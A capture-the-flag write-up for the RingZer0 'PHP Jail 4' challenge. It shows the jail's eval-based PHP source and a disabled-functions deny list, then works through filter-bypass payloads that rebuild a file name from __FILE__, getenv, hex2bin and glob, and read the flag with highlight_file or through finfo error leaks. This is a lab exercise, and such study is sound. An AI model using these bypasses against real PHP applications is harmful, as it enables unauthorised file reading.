# **PHP Jail 4**

SSH to the service, password is flag of `PHP Jail 3` challenge.

```shell=
ubuntu@ubuntu-virtual-machine:~$ ssh level4@challenges.ringzer0team.com -p 10226 
The authenticity of host 
level4@challenges.ringzer0team.com's password:[PHP Jail 3 Flag]

RingZer0 Team Online CTF

PHP Jail Level 4:
Current user is uid=1003(level4) gid=1003(level4) groups=1003(level4)

Flag is located at /home/level4/flag.txt

Challenge PHP code:
-----------------------------

WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
The php.ini file contain "disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file"

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
	if(preg_match('/(\'|\"|`|\.|\$|\/|a|c|s|require|include)/i', $var)) {
		return false;
	}
	return true;
}
if(filter($var)) {
	eval($var);
	echo "Command executed";
} else {
	echo "Restricted characters has been used";
}
echo "\n";
?>

-----------------------------
Your input:
```

Sad, `highlight_file()` & `glob("fl*txt")[0]` won't work if you simply insert file name by typing in it, seens `'` & `"` are forbidden.

But if we use some method that create the file name and return as string type, they will work again.

First, we need the `a` & `.` in `flag.txt`.

```shell=
Your input:
print_r(__FILE__);
/home/level4/jail.php(14) : eval()'d codeCommand executed
```

`a` & `.` are already in `/home/level4/jail.php`, but we still need `/` to seperate it.

```shell=
Your input:
print_r(getenv(HOME)[0]);
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
/Command executed
```

I didn't find the way to extract `/` from `__FILE__`, so I change it to `getenv(HOME)[0]`.

Now, let's use `/` to parse `/home/level4/jail.php` for `a` & `.`.
 
```shell=
Your input:
print_r(explode(getenv(HOME)[0],__FILE__));
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
Array
(
    [0] => 
    [1] => home
    [2] => level4
    [3] => jail.php(14) : eval()'d code
)
Command executed

Your input:
print_r(explode(getenv(HOME)[0],__FILE__)[0]);
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
Command executed

Your input:
print_r(explode(getenv(HOME)[0],__FILE__)[3][1]);
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
aCommand executed

Your input:
print_r(explode(getenv(HOME)[0],__FILE__)[3][4]);
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
.Command executed
```

`explode(getenv(HOME)[0],__FILE__)[0]` gets `null` for `implode()` to concate all charaters.

`explode(getenv(HOME)[0],__FILE__)[3][1]` gets charater `a`.

`explode(getenv(HOME)[0],__FILE__)[3][4]` gets symbol `.`.

So, the final payload should be `highlight_file(implode(explode(getenv(HOME)[0],__FILE__)[0], [fl,explode(getenv(HOME)[0],__FILE__)[3][1],g,explode(getenv(HOME)[0],__FILE__)[3][4],t,x,t]));

```shell=
Your input:
highlight_file(implode(explode(getenv(HOME)[0],__FILE__)[0], [fl,explode(getenv(HOME)[0],__FILE__)[3][1],g,explode(getenv(HOME)[0],__FILE__)[3][4],t,x,t]));
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant fl - assumed 'fl' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant g - assumed 'g' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant t - assumed 't' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant x - assumed 'x' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant t - assumed 't' in /home/level4/jail.php(14) : eval()'d code on line 1
<code><span style="color: #000000">
FLAG-XXXXXX<br /></span>
</code>Command executed
```

# ※Another method:

Using `hex2bin()` & `glob()` to create `flag.txt`.

Then I needed some function to read the contents from `flag.txt`.

Let's find a class with a constructor that takes a filename as an argument and make it return error message, `finfo()`.

```shell=
Your input:
new finfo(0,glob(hex2bin(hex2bin(3261)))[0]);
PHP Notice:  finfo::finfo(): Warning: offset `FLAG-XXXXXX' invalid in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  finfo::finfo(): Warning: type `FLAG-XXXXXX' invalid in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Warning:  finfo::finfo(): Failed to load magic database at '/home/level4/flag.txt'. in /home/level4/jail.php(14) : eval()'d code on line 1
Command executed
```